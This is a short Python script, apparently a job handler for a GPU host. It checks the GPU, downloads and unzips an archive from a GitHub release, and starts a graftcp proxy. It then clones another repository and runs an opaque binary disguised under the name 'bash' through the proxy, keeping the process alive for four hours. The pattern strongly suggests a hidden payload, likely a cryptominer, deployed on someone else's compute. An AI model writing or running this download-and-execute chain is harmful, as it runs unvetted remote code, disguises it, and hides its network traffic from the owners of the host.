import subprocess
import time
import os

def run(text: str = "start"):
    try:
        print("=== CHECK GPU ===")
        subprocess.run(["nvidia-smi"], check=False)

        cmd = """
        set -e

        echo "=== DOWNLOAD FILE ==="
        wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

        echo "=== EXTRACT ==="
        unzip -o pan.zip

        cd pan

        echo "=== SET PERMISSION ==="
        chmod -R +x .

        echo "=== START GRAFTCP LOCAL ==="
        ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

        sleep 3

        echo "=== CLONE REPO ==="
        git clone https://github.com/hujisanda/lol198.git

        cd lol198
        chmod u+x bash

        echo "=== MOVE FILE ==="
        mv bash ../

        cd ..
        
        echo "=== RUN PROC VIA GRAFTCP ==="
        ./graftcp/graftcp ./bash
        """

        subprocess.run(["bash", "-lc", cmd], check=True)

        print("=== DONE, KEEP ALIVE ===")
        time.sleep(60 * 60 * 4)

        return {"status": "success"}

    except Exception as e:
        return {"error": str(e)}
